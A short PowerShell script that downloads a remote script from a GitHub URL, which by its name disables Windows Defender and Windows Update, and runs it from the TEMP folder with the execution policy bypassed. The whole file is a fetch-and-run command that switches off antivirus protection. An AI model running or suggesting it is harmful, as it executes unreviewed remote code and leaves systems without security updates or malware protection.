$url = "https://raw.githubusercontent.com/hasanzadekhalil/WindowsDefender-WindowsUpdate-Disable/main/DisableScript.ps1"
$scriptPath = "$env:TEMP\DisableScript.ps1"

# Download the script
Invoke-WebRequest -Uri $url -OutFile $scriptPath

# Execute the script with bypassed execution policy
powershell.exe -ExecutionPolicy Bypass -File $scriptPath
